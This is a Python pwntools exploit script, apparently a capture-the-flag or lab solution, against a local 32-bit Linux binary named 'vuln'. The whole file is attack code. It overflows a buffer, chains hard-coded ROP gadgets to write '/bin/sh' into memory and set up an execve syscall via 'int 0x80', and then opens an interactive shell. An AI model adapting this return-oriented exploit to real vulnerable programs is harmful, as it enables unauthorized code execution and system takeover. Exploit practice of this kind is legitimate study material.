#! /usr/bin/env python

from pwn import *

context(arch='i386', os='linux')


p = process('./vuln')

# payload 
offset = int(28)
data = 0x080e5060
pop_eax_edx_ebx = 0x080583c6  # add byte ptr [eax], al ; pop eax ; pop edx ; pop ebx ; ret
pop_eax = 0x080b0749          # inc eax ; pop eax ; ret
pop_ecx = 0x08049e39          # pop ecx ; ret
mov_dwebx_eax = 0x080a068c    # mov dword ptr [ebx], eax ; xor ebx, ebx ; jmp 0x80a0653
int_0_80 = 0x0807164f         # nop ; int 0x80

payload = b'a'*offset

# first rop: "/bin"
payload += flat(
    pop_eax_edx_ebx,
    "/bin",
    0,
    data,
    mov_dwebx_eax
)

# second rop: "/sh\x00"
payload += flat(
    pop_eax_edx_ebx,
    "/sh\x00",
    0,
    data+4,
    mov_dwebx_eax
)

# third rop
payload += flat(
    pop_eax_edx_ebx,
    0x0b,
    0,
    data,
    pop_ecx,
    0,
    int_0_80
)

gdb.attach(p)
pause()
p.sendline(payload)
p.interactive()
